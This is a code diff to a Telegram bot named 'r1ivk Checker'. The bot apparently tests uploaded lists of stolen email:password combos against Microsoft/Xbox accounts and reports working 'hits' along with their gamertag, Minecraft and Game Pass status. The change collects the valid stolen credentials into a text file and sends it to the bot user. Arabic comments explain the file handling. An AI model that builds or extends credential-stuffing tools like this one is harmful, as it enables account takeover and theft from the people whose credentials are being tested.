@@ -1,8 +1,9 @@
 # -*- coding: utf-8 -*-
 """
-r1ivk Checker ⚡ - Telegram Bot Version (Pro English)
+r1ivk Checker ⚡ - Telegram Bot Version (File Output Pro)
 """
 
+import os
 import re
 import time
 import requests
@@ -241,6 +242,7 @@ async def handle_document(message: types.Message):
     checked = 0
     hits = 0
     bad = 0
+    hit_lines = []
 
     for idx, combo in enumerate(combos, 1):
         result = check_single_account(combo)
@@ -248,6 +250,9 @@ async def handle_document(message: types.Message):
         
         if result['status'] == 'hit':
             hits += 1
+            hit_data = f"{result['email']}:{result['password']} | Gamertag: {result['gamertag']} | Score: {result['gamerscore']} | MC: {result['minecraft']} | GP: {result['gamepass']}"
+            hit_lines.append(hit_data)
+
             hit_text = (
                 f"🔥 *r1ivk Checker - NEW HIT!*\n\n"
                 f"📧 Email: `{result['email']}`\n"
@@ -262,7 +267,6 @@ async def handle_document(message: types.Message):
         else:
             bad += 1
 
-        # Update live stats message every 5 accounts or at the end to avoid flood limits
         if idx % 5 == 0 or idx == total:
             percentage = (checked / total) * 100
             try:
@@ -280,14 +284,25 @@ async def handle_document(message: types.Message):
 
         time.sleep(0.3)
 
-    await message.answer(
-        f"✅ *Checking Completed Successfully!*\n\n"
-        f"📊 Total Checked: `{total}`\n"
-        f"🔥 Total Hits: `{hits}`\n"
-        f"❌ Total Bad: `{bad}`\n"
-        f"👑 Owner: r1ivk",
+    # حفظ الهيتس في ملف نصي وإرساله في النهاية
+    file_path = f"hits_{message.from_user.id}.txt"
+    with open(file_path, "w", encoding="utf-8") as f:
+        f.write("\n".join(hit_lines))
+
+    input_file = types.FSInputFile(file_path)
+    await message.answer_document(
+        input_file,
+        caption=f"✅ *Checking Completed Successfully!* 🎉\n\n"
+                f"📊 Total Checked: `{total}`\n"
+                f"🔥 Total Hits: `{hits}`\n"
+                f"❌ Total Bad: `{bad}`\n"
+                f"👑 Owner: r1ivk",
         parse_mode="Markdown"
     )
+
+    # حذف الملف من السيرفر بعد الإرسال لتنظيف المساحة
+    if os.path.exists(file_path):
+        os.remove(file_path)
 
 if __name__ == "__main__":
     import asyncio
